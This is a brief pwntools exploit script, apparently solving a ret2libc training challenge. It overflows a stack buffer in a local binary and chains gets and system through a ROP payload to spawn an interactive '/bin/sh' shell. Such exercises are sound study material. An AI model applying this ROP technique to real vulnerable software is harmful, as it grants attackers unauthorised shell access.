from pwn import *
ebp= 0xff85eae8
esp= 0xff85ea60
system_plt=0x08048490
gets_plt=0x08048460
str=esp+0x80-0x64
pop_ebx=0x0804843d

elf = ELF('./ret2libc2')
print(ebp-str+4)
# 获取.bss段地址
bss_addr = elf.bss()
buf2 = bss_addr + 0x80
payload=b'A'*(ebp-str+4)+p32(gets_plt)+p32(pop_ebx)+p32(buf2)+p32(system_plt)+b'c'*4+p32(buf2)
io = process('./ret2libc2')
io.sendline(payload)
io.sendline(b'/bin/sh')
io.interactive()
